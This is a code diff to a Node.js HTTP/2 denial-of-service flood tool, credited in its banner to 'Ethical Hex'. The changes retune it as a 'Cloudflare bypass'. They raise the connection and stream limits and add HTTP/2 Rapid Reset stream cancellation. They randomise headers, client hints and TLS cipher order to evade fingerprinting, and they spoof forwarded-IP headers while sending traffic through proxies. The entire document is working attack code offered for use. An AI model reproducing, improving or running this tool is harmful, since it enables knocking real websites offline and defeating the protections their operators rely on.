@@ -75,14 +75,15 @@ if (proxies.length === 0) {
 
 const url = new URL(target);
 
-// -------- OPTIMIZED PARAMETERS --------
+// -------- ADVANCED PARAMETERS (Tuned for Cloudflare bypass) --------
 const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
-const MAX_CONNS = 1200;
-const MAX_STREAMS = 900;
-const STREAMS_PER_CONN = 150000;
-const YIELD_EVERY = 1000;
-const BATCH_SIZE = 60;
+const MAX_CONNS = 1500;
+const MAX_STREAMS = 1200;
+const STREAMS_PER_CONN = 200000;
+const YIELD_EVERY = 800;
+const BATCH_SIZE = 80;
 const CONNS_PER_PROXY = 1;
+const RAPID_RESET_PROB = 0.15;
 
 // -------- FULL 400+ USER-AGENT LIST (Complete) --------
 const HARDCODED_UAS = [
@@ -491,7 +492,11 @@ const HARDCODED_UAS = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.0.0 Safari/537.36 Edg/80.0.0.0'
 ];
 
-// -------- HTTP/2 constants --------
+// Additional randomized headers
+const ACCEPT_ENCODINGS = ['gzip, deflate, br', 'gzip, deflate', 'gzip', 'br'];
+const UPGRADE_INSECURE = ['1', ''];
+const DNT = ['1', '0', ''];
+const CONNECTION_HEADERS = ['keep-alive', 'close', ''];
 const ACCEPT = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
 const ACCEPT_LANG = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.9', 'de-DE,de;q=0.9', 'ja-JP,ja;q=0.9', 'zh-CN,zh;q=0.9'];
 const CACHE_CONTROL = ['no-cache, no-store, must-revalidate', 'no-cache', 'max-age=0', 'private, no-cache'];
@@ -509,13 +514,18 @@ const REFERERS = [
     'https://www.linkedin.com/',
     '',
 ];
+const SEC_CH_UA = [
+    '"Chromium";v="120", "Not?A_Brand";v="99"',
+    '"Google Chrome";v="120", "Chromium";v="120"',
+    '"Not_A_Brand";v="99", "Chromium";v="120"',
+];
 
 const reqPath = url.pathname + (url.search || '') || '/';
 const authority = (url.port && url.port !== '443' && url.port !== '80')
     ? url.hostname + ':' + url.port
     : url.hostname;
 
-// -------- HPACK and Frame Functions --------
+// Frame functions
 function encodeFrame(streamId, type, payload, flags) {
     payload = payload || Buffer.alloc(0);
     flags = flags || 0;
@@ -583,6 +593,10 @@ function buildHeaders(ua, path) {
     const cacheCtrl = CACHE_CONTROL[Math.floor(Math.random() * CACHE_CONTROL.length)];
     const pragma = PRAGMA[Math.floor(Math.random() * PRAGMA.length)];
     const referer = REFERERS[Math.floor(Math.random() * REFERERS.length)];
+    const acceptEnc = ACCEPT_ENCODINGS[Math.floor(Math.random() * ACCEPT_ENCODINGS.length)];
+    const upgradeInsecure = UPGRADE_INSECURE[Math.floor(Math.random() * UPGRADE_INSECURE.length)];
+    const dnt = DNT[Math.floor(Math.random() * DNT.length)];
+    const secChUa = SEC_CH_UA[Math.floor(Math.random() * SEC_CH_UA.length)];
     const headers = [
         [':method', 'GET'],
         [':authority', authority],
@@ -591,19 +605,19 @@ function buildHeaders(ua, path) {
         ['user-agent', ua],
         ['accept', ACCEPT],
         ['accept-language', acceptLang],
-        ['accept-encoding', 'gzip, deflate, br'],
+        ['accept-encoding', acceptEnc],
         ['cache-control', cacheCtrl],
         ['pragma', pragma],
         ['cookie', cookie],
-        ['sec-ch-ua', '"Chromium";v="120", "Not?A_Brand";v="99"'],
+        ['sec-ch-ua', secChUa],
         ['sec-ch-ua-mobile', '?0'],
         ['sec-ch-ua-platform', '"Windows"'],
         ['sec-fetch-dest', 'document'],
         ['sec-fetch-mode', 'navigate'],
         ['sec-fetch-site', 'none'],
-        ['sec-fetch-user', '?1'],
-        ['upgrade-insecure-requests', '1'],
+        ['upgrade-insecure-requests', upgradeInsecure],
     ];
+    if (dnt) headers.push(['dnt', dnt]);
     if (referer) headers.push(['referer', referer]);
     if (Math.random() > 0.3) {
         headers.push(['x-forwarded-for', Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)]);
@@ -611,7 +625,8 @@ function buildHeaders(ua, path) {
     if (Math.random() > 0.5) {
         headers.push(['x-real-ip', Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)]);
     }
-    const payload = h.encode(headers);
+    const shuffled = headers.sort(() => Math.random() - 0.5);
+    const payload = h.encode(shuffled);
     const padLen = Math.floor(Math.random() * 16);
     const padded = Buffer.alloc(padLen + payload.length + 1);
     padded.writeUInt8(padLen, 0);
@@ -619,7 +634,7 @@ function buildHeaders(ua, path) {
     return padded;
 }
 
-// -------- Statistics --------
+// Statistics
 let activeConns = 0;
 let connOK = 0;
 let connFail = 0;
@@ -629,7 +644,7 @@ let goawayTotal = 0;
 let rstTotal = 0;
 let proxyIdx = 0;
 
-// -------- Connection Function --------
+// Connection Function with Rapid Reset
 function startRequest() {
     if (activeConns >= MAX_CONNS) return;
     activeConns++;
@@ -695,12 +710,24 @@ function startRequest() {
     }
 
     function startTls(socket) {
+        const cipherList = [
+            'TLS_AES_128_GCM_SHA256',
+            'TLS_AES_256_GCM_SHA384',
+            'TLS_CHACHA20_POLY1305_SHA256',
+            'ECDHE-RSA-AES128-GCM-SHA256',
+            'ECDHE-RSA-AES256-GCM-SHA384',
+            'ECDHE-ECDSA-AES128-GCM-SHA256',
+            'ECDHE-ECDSA-AES256-GCM-SHA384',
+            'ECDHE-RSA-CHACHA20-POLY1305',
+            'ECDHE-ECDSA-CHACHA20-POLY1305',
+        ].sort(() => Math.random() - 0.5).join(':');
+
         const tlsOptions = {
             socket: socket,
             ALPNProtocols: ['h2'],
             servername: url.hostname,
             rejectUnauthorized: false,
-            ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384',
+            ciphers: cipherList,
             sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
             secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
             minVersion: 'TLSv1.2',
@@ -788,6 +815,12 @@ function startRequest() {
                         streamId += 2;
                         sentTotal++;
 
+                        if (Math.random() < RAPID_RESET_PROB && openStreams > 10) {
+                            const rstFrame = encodeFrame(streamId - 2, 3, Buffer.from([0x00, 0x00, 0x00, 0x08]), 0);
+                            batch.push(rstFrame);
+                            openStreams = Math.max(0, openStreams - 1);
+                        }
+
                         if (batch.length >= BATCH_SIZE) {
                             try {
                                 tlsSocket.cork();
@@ -843,13 +876,14 @@ function startRequest() {
     }
 }
 
-// -------- Cluster Setup --------
+// Cluster Setup
 if (cluster.isMaster) {
-    console.log('Made By Ethical Hex - ULTIMATE HTTP/2 FLOOD (FULL UA)');
+    console.log('Made By Ethical Hex - ADVANCED Cloudflare Bypass (UAM + RateLimit)');
     console.log('Proxies loaded:', proxies.length);
     console.log('Target:', target);
     console.log('Duration:', time, 'seconds');
     console.log('Threads:', threads);
+    console.log('Rapid Reset probability:', RAPID_RESET_PROB);
     for (let i = 0; i < threads; i++) {
         cluster.fork({ core: i % os.cpus().length });
     }
